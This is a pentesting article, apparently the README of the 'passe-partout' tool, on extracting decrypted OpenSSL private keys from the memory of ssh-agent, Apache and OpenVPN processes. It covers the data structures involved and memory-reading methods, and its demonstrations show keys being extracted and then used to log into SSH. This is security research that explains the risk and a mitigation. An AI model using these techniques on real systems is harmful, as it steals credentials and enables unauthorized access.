# In-memory extraction of SSL private keys


Cet article est disponible en francais à `README.fr.md`.

The tool passe-partout presented all along this tip can be found at passe-partout.


# Introduction

Asymetric cryptography usage is growing for software with important
confidentiality needs. The security of those algorithms depends on the private
key confidentiality. Usually, software manipulating RSA or DSA secret keys ask
the user a password in order to decipher the private key stored on the
filesystem.

Among them can be found :
 - Apache HTTP server, which unciphers private keys associated to SSL
   certificates at startup ;
 - ssh-agent for SSH keys (RSA or DSA) ;
 - OpenVPN for server or client certificates, depending on its usage.

This article presents a generic method allowing to extract OpenSSL private keys
hold in a process memory, and describe it's usage for the three software
previously cited.

# OpenSSL data structures

## RSA structure

OpenSSL RSA man page `rsa(3)` provides the main pieces of information related
to the RSA structure used by libcrypto:

`rsa(2)` extract:

   These functions implement RSA public key encryption and signatures as
   defined in PKCS #1 v2.0 [RFC 2437].

   The RSA structure consists of several BIGNUM components. It can contain
   public as well as private RSA keys:

```C
    struct
           {
           BIGNUM *n;              // public modulus
           BIGNUM *e;              // public exponent
           BIGNUM *d;              // private exponent
           BIGNUM *p;              // secret prime factor
           BIGNUM *q;              // secret prime factor
           BIGNUM *dmp1;           // d mod (p-1)
           BIGNUM *dmq1;           // d mod (q-1)
           BIGNUM *iqmp;           // q^-1 mod p
           // ...
           };
```
    RSA



This structure includes all the integers involved in RSA signing and ciphering
(n, e, d), and some integers involved in speed optimizations.

## DSA structure

OpenSSL DSA man page dsa(3) describes the data structures and the main
functions:

`dsa(3)` extract:

   The DSA structure consists of several BIGNUM components.

```C
    struct
           {
           BIGNUM *p;              // prime number (public)
           BIGNUM *q;              // 160-bit subprime, q | p-1 (public)
           BIGNUM *g;              // generator of subgroup (public)
           BIGNUM *priv_key;       // private key x
           BIGNUM *pub_key;        // public key y = g^x
           // ...
           }
    DSA;
```


## BIGNUM structure

Once again, `bn_internal(3)` OpenSSL manpage describes data structures and main
methods:

`/usr/include/openssl/bn.h` extract:

```C
    struct bignum_st
        {
        BN_ULONG *d;    /* Pointer to an array of 'BN_BITS2' bit chunks. */
        int top;    /* Index of last used d +1. */
        /* The next are internal book keeping for bn_expand. */
        int dmax;   /* Size of the d array. */
        int neg;    /* one if the number is negative */
        int flags;
        };
```


This quite simple structure provides OpenSSL the ability to store big integers,
since RSA keys may hold thousands of bits.

# In-memory private keys storage ?

## ssh-agent

Extract from `ssh-agent(1)` manpage:


 "ssh-agent is a program to hold private keys used for public key
  authentication (RSA, DSA).  The idea is that ssh-agent is started in
  the beginning of an X-session or a login session, and all other
  windows or programs are started as clients to the ssh-agent program."



Private keys are registered in ssh-agent by ssh-add using the socket specified
in environment variables. When a private key is added, the key is deciphered if
necessary in order to be available for some time and stored into memory.

The file key.h, included by ssh-agent.c, has the following structures:

This file also contains the RSA and DSA keys data structures of libcrypto:

extract of `key.h,v 1.24`:


```C
    struct Key {
        int type;
        int flags;
        RSA *rsa;                                   <===
        DSA *dsa;                                   <===
    };
```


"RSA" and "DSA" structures have all the informations needed to extract private
key in clear-text (decrypted).

```bash
$ ldd /usr/bin/ssh-agent | grep libcrypto
  libcrypto.so.0.9.8 => /usr/lib/i686/cmov/libcrypto.so.0.9.8 (0xb7d8a000)
```



Since the 12 of Augoust 2002, setgid(2) and setegid(2) calls have been added
to the ssh-agent source code in order to prevent the process memory to be
read by any non-root user:

http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.99&r2=1.98&f=h



## Apache

Thanks to mod_ssl, Apache2 is able to serve websites over HTTPS.


```ApacheConf
    SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
    SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
```



If the private key is password protected, httpd will ask the user for the
password at startup (or when restart occurs).


```bash
$ ldd /usr/lib/apache2/modules/mod_ssl.so | grep libcrypto
  libcrypto.so.0.9.8 => /usr/lib/i686/cmov/libcrypto.so.0.9.8 (0xb7d4c000)
```



Private keys are stored as `EVP_PKEY` structures, inside the `modssl_pk_server_t`
structure:

`modules/ssl/ssl_private.h` extract:

```C
    /** public cert/private key */
    typedef struct {
         /**
          * server only has 1-2 certs/keys
          * 1 RSA and/or 1 DSA
          */
         const char  *cert_files[SSL_AIDX_MAX];
         const char  *key_files[SSL_AIDX_MAX];
         X509        *certs[SSL_AIDX_MAX];
         EVP_PKEY    *keys[SSL_AIDX_MAX];           <===

         /** Certificates which specify the set of CA names which should be
          * sent in the CertificateRequest message: */
         const char  *ca_name_path;
         const char  *ca_name_file;
    } modssl_pk_server_t;
```




## OpenVPN

OpenVPN configuration extract:

```ApacheConf
     cert client.crt
     key client.key
```


We can quickly obtain confirmation of the fact that OpenVPN
uses OpenSSL keys by looking at which librairies it is linked to:


```bash
   $ ldd /usr/sbin/openvpn | grep libcrypto
        libcrypto.so.0.9.8 => /lib/i686/cmov/libcrypto.so.0.9.8 (0x0060e000)
```



PEM certificates management is delegated to OpenSSL library. Hence keys are
implicitly stored in EVP_PKEY structures because of the use of the function
`SSL_CTX_use_PrivateKey_file`.


# Implementation of a key extractor

In order to read a process memory, each exploitation system has a particular
API.

For example, on Linux, the memory can be read by two methods:
  - by reading the procfs file `/proc/${pid}/mem`
  - by using the so called debugging API `ptrace(2)` with `PTRACE_PEEKDATA` command.

Private keys lookup involves the identification of several variables and
structures stored in the memory area of the targetted process.

The data may be on:
  - the stack
  - the heap
  - in the binary .data segment
  - in an anonymous page (eg a page allocated with mmap).


## Reading a process memory

In order to be portable, the tool uses operating system specific code
to read the target process memory.

The techniques used to read memory are summed up below:

|  OS          | function
|--------------|------------------------
| Linux        | ptrace(PTRACE_PEEKDATA)
| Solaris      | ptrace(2)
| *BSD         | ptrace(PT_READ_D)
| HP-UX        | ttrace(TTRACE_READ)
| Windows      | ReadProcessMemory
| Mac OS X     | vm_read_overwrite



Here are the techniques used by our tool to list the valid memory zones of a process:

| OS           | mean
|--------------|--------------------
| Linux        | Read /proc/pid/maps
| Solaris      | Read /proc/pid/map (prmap_t array)
| FreeBSD      | Read /proc/pid/map
| NetBSD       | Read /proc/pid/maps or "pmap -l -p"
| OpenBSD      | "procmap -l -p"
| DragonFlyBSD | Read /proc/pid/map
| Mac OS X     | Function mach_vm_region


The usage of commands such as `pmap` or `procmap` allow to list the zones of a
process without root privileges on some Unix. Indeed, the BSD family use set-uid
binaries in order to read information directly into kernel memory (`/dev/kmem`).

Since the tool is meant to be used without necessarily having root privileges,
it uses the system set-uid root binaries.

Here is an example of a listing of memory zones used by ssh-agent:


```bash
$ head -n 3 /proc/2620/maps
08048000-08058000 r-xp 00000000 08:01 446297  /usr/bin/ssh-agent
08058000-08059000 rw-p 0000f000 08:01 446297  /usr/bin/ssh-agent  <===
08059000-0807b000 rw-p 08059000 00:00 0       [heap]              <===
```




## Validating the retrieved data

The memory is browsed in order to retrieve RSA and DSA structures. Those
structures have the particularity to hold contiguous pointers heading to BIGNUM
structures. Each BIGNUM holds itself a pointer to a BN_ULONG array.

Those structures can't be accessed directly from our programm (since they aren't
in the memory of our process). They have to be accessed through our memory
reading methods.

Once the structure has been found (assuming we have been able to read and
interpret each pointer as BIGNUM), we have to check it really is a RSA or DSA
structure.

OpenSSL provides the RSA_check_key function, which takes as argument an RSA
structure, and perform some tests:

RSA public key
- p and q are both prime numbers
- `n = p * q`
- `(x^e)^d = x [n]`



For DSA, we have to "manually" check the key since no function is provided:

DSA public key:
- `pub_key = a^p [m]`




# Demonstrations

The tool passe-partout presented all along this tip can be found at passe-partout.

## ssh-agent

RSA public and private keys generation using password "mysuperpassword"
as password:


```bash
$ ssh-keygen -qN mysuperpassword -t rsa -f /tmp/myrsa.key
```


Overwrite SSHv2 authorized keys access list on server side with the
newly generated public key:


```bash
$ scp /tmp/myrsa.key.pub 192.168.0.1:~/.ssh/authorized_keys2
admin@192.168.0.1's password:
myrsa.key.pub                              100%  393     0.4KB/s   00:00
```


Starting of a new ssh-agent instace:


```bash
$ eval `ssh-agent`
Agent pid 4712
```


Registration of the newly generated private key:


```bash
$ ssh-add /tmp/myrsa.key
Enter passphrase for /tmp/myrsa.key:
Identity added: /tmp/myrsa.key (/tmp/myrsa.key)
```


Starting from now private key is hold in clear inside the ssh-agent
process memory. We can read the clear key by using the key extractor
with root privileges:


```bash
$ sudo ./passe-partout 4712
[sudo] password for jb:
Target has pid 4712
on_signal(17 - SIGCHLD) from 4712
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[X] Valid RSA key found.
[X] Key saved to file id_rsa-0.key
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
done for pid 4712
```




We can now save the extracted private key to /tmp/myplain.key
and clear all identities registred to ssh-agent.


```bash
$ ssh-add -D
All identities removed.
```


And finally we can authenticate with the previously extracted private
key to the SSH server. Private key (/tmp/myplain.key) permissions must
be 0600.


```bash
$ ssh -2vF /dev/null -i id_rsa-0.key -o "PreferredAuthentications publickey" 192.168.0.1
OpenSSH_4.3p2 Debian-6, OpenSSL 0.9.8e 23 Feb 2007
debug1: Reading configuration data /dev/null
debug1: Connecting to 192.168.0.1 [192.168.0.1] port 22.
debug1: Connection established.
debug1: identity file myplain.key type -1
[...]
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: myplain.key                          <===
debug1: read PEM private key done: type RSA                      <===
debug1: Authentication succeeded (publickey).                    <===
debug1: channel 0: new [client-session]
debug1: Entering interactive session.

Last login: Wed Aug 22 17:16:00 2007 from 192.168.0.51
admin@192.168.0.1:~$
```



  "voila" :)

## Serveur HTTP Apache

Key extraction targetting an Apache HTTP server is way more verbous:

```bash
  $ ./passe-partout 29960
  Target has pid 29960
  on_signal(17 - SIGCHLD) from 29960
  [-] invalid DSA key.
  [-] invalid DSA key.
  [...]
  [-] unable to check key.
  [-] unable to check key.
  [X] Valid DSA key found.
  [X] Key saved to file id_dsa-0.key
  [-] unable to check key.
  [...]
  [X] Valid DSA key found.
  [X] Key saved to file id_dsa-26.key
  [...]
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-0.key
  [...]
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-2.key
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  done for pid 29960
  $ ls *key
  id_dsa-0.key   id_dsa-15.key  id_dsa-20.key  id_dsa-26.key  id_dsa-7.key
  id_dsa-10.key  id_dsa-16.key  id_dsa-21.key  id_dsa-2.key   id_dsa-8.key
  id_dsa-11.key  id_dsa-17.key  id_dsa-22.key  id_dsa-3.key   id_dsa-9.key
  id_dsa-12.key  id_dsa-18.key  id_dsa-23.key  id_dsa-4.key   id_rsa-0.key
  id_dsa-13.key  id_dsa-19.key  id_dsa-24.key  id_dsa-5.key   id_rsa-1.key
  id_dsa-14.key  id_dsa-1.key   id_dsa-25.key  id_dsa-6.key   id_rsa-2.key
```



Despite the presence of a single vhost over this server, using only one SSL
certificate (default Debian certificate), it is clear that httpd hold dozen of
keys in its memory (26 DSA keys, 3 RSA keys). Those keys are generated when
mod_ssl is started.

These keys are all differents, therefore it is necessary to find the key
which match the server certificate. The other keys are temporarily generated.

In order to do this, the match_private_key.rb script read each key and compare
it's modulus (n=p*q) to the one of the server's modulus (since it is published
in its certificate).

This tool can be used in two ways:

 - by manually fetching server ceritificate:

```bash
  $ openssl s_client -connect localhost:443> server_certificate.txt
  depth=0 /CN=ubuntu
  verify error:num=18:self signed certificate
  verify return:1
  depth=0 /CN=ubuntu
  verify return:1
  $ ruby match_private_key.rb server_certificate.txt
  id_rsa-2.key
```


 - or by letting the script obtaning the certificate itself:

```bash
  $ ruby match_private_key.rb https://server.fr
  id_rsa-2.key
```



The test is simply done by iterating on each extracted key:


```ruby
  if key.public_key.to_pem == server_cert.public_key.to_pem then
    puts "#{key_file} is the private key associated to the certificate #{ARGV[0]}"
    exit 1
  end
```






## OpenVPN

The method is identical with OpenVPN:


```bash
  $ ps aux|grep openvpn
  root     30006  0.0  0.1   5116  3060 pts/25   S+   14:54   0:00 openvpn openvpn.config
  jb       31179  0.0  0.0   3056   824 pts/22   R+   15:02   0:00 grep --color openvpn
  $ sudo ./passe-partout 30006
  Target has pid 30006
  testing /lib/tls/i686/cmov/libc-2.10.1.so (0x251000)
  testing anonymous (0x252000)
  testing /lib/i686/cmov/libcrypto.so.0.9.8 (0x4ea000)
  testing anonymous (0x4f7000)
  testing /usr/lib/liblzo2.so.2.0.0 (0x747000)
  testing /lib/libz.so.1.2.3.3 (0x794000)
  testing /lib/tls/i686/cmov/libpthread-2.10.1.so (0x979000)
  testing anonymous (0x97a000)
  testing /lib/ld-2.10.1.so (0xc0f000)
  testing /lib/tls/i686/cmov/libdl-2.10.1.so (0xc52000)
  testing /lib/i686/cmov/libssl.so.0.9.8 (0xd82000)
  testing /usr/lib/libpkcs11-helper.so.1.0.0 (0xf7b000)
  testing /usr/sbin/openvpn (0x80c0000)
  testing anonymous (0x80c1000)
  testing [heap] (0x85c3000)
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-0.key
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  testing anonymous (0xb7754000)
  testing anonymous (0xb778f000)
  testing [stack] (0xbfdab000)
  done for pid 30006
```


The extraction is successfull, as shown by comparison of the extracted key with
the original key:




# Conclusion

The most important point here is the fact that any "keyring" application is
potentially vulnerable to this attack. The only possible protection would be to
delete secrets (in our case, keys) from memory immediatly after usage. This is
often done after some configurable delay. Using a low delay reduces the interest
of a keyring.

This article considers the case of RSA/DSA keys with OpenSSL. However, this
method can be applied to any kind of secret, for example with NTLM hashes
stored in the lsass.exe process memory.

The interest of the in memory keys extraction is the absence of modification of
the environment, of programms or configuration during a pentest.

- Nicolas Collignon

- Jean-Baptiste Aviat (@jbaviat)


# References

 - OpenSSH web site:
   http://www.openssh.org

 - OpenVPN web site:
   http://openvpn.net

 - Apache httpd web site:
   http://httpd.apache.org

 - "OpenSSH client for ease, fun and ... profit":
   http://www.hsc.fr/ressources/breves/ssh_config.html.fr

First published on http://www.hsc.fr/ressources/breves/passe-partout.html.en
